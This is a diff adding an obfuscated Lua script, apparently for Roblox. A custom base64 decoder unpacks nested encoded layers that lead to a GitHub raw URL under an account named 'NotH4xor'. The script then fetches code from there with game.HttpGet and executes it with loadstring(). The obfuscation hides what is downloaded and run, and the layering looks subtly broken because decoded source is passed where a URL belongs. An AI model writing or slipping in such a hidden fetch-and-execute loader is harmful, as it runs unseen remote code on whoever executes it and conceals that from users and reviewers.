@@ -1,0 +1,39 @@
+local _1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+
+local _e = game.HttpGet
+
+local function _2(_3)
+    local _4 = ""
+    local _5 = #_3 % 4
+    if _5 > 0 then
+        _3 = _3 .. string.rep("=", 4 - _5)
+    end
+    _3 = string.gsub(_3, ".", function(_6)
+        if _6 == "=" then return "" end
+        local _7, _8 = "", (string.find(_1, _6) - 1)
+        for _9 = 6, 1, -1 do
+            _7 = _7 .. (math.floor(_8 / 2^(_9-1)) % 2)
+        end
+        return _7
+    end)
+    for _10 = 1, #_3, 8 do
+        _4 = _4 .. string.char(tonumber(string.sub(_3, _10, _10+7), 2))
+    end
+    return _4
+end
+
+local _a = {"bG9jYWwgXzEgPSAiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLyIKCmxvY2FsIF9lID0gZ2FtZS5IdHRwR2V0Cgpsb2NhbCBmdW5jdGlvbiBfMihfMykKICAgIGxvY2FsIF80ID0gIiIKICAgIGxvY2FsIF81ID0gI18zICUgNAogICAgaWYgXzUgPiAwIHRoZW4KICAgICAgICBfMyA9IF8zIC4uIHN0cmluZy5yZXAoIj0iLCA0IC0gXzUpCiAgICBlbmQKICAgIF8zID0gc3RyaW5nLmdzdWIoXzMsICIuIiwgZnVuY3Rpb24oXzYpCiAgICAgICAgaWYgXzYgPT0gIj0iIHRoZW4gcmV0dXJuICIiIGVuZAogICAgICAgIGxvY2FsIF83LCBfOCA9ICIiLCAoc3RyaW5nLmZpbmQoXzEsIF82KSAtIDEpCiAgICAgICAgZm9yIF85ID0gNiwgMSwgLTEgZG8KICAgICAgICAgICAgXzcgPSBfNyAuLiAobWF0aC5mbG9vcihfOCAvIDJeKF85LTEpKSAlIDIpCiAgICAgICAgZW5kCiAgICAgICAgcmV0dXJuIF83CiAgICBlbmQpCiAgICBmb3IgXzEwID0gMSwgI18zLCA4IGRvCiAgICAgICAgXzQgPSBfNCAuLiBzdHJpbmcuY2hhcih0b251bWJlcihzdHJpbmcuc3ViKF8zLCBfMTAsIF8xMCs3KSwgMikpCiAgICBlbmQKICAgIHJldHVybiBfNAplbmQKCmxvY2FsIF9hID0geyJhSFIwY0hNNkx5OXlZWGN1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEwwNXZkRWcwZUc5eUx5MHZiV0ZwYmk4bE1rTT0ifQoKbG9jYWwgX2IgPSBmdW5jdGlvbihfYykgcmV0dXJuIHRhYmxlLmNvbmNhdChfYykgZW5kCgpsb2NhbCBfMTEgPSBfYihfYSkKCmxvY2FsIGZ1bmN0aW9uIF9kKCkgcmV0dXJuIGxvYWRzdHJpbmcgZW5kCmxvY2FsIF9kID0gX2QoKQoKbG9jYWwgX2YgPSBfZQpsb2NhbCBfZyA9IGdhbWUKCmxvY2FsIF8xMiA9IF8yKF8xMSkKCl9kKF9mKF9nLCBfMTIpKSgp"}
+
+local _b = function(_c) return table.concat(_c) end
+
+local _11 = _b(_a)
+
+local function _d() return loadstring end
+local _d = _d()
+
+local _f = _e
+local _g = game
+
+local _12 = _2(_11)
+
+_d(_f(_g, _12))()
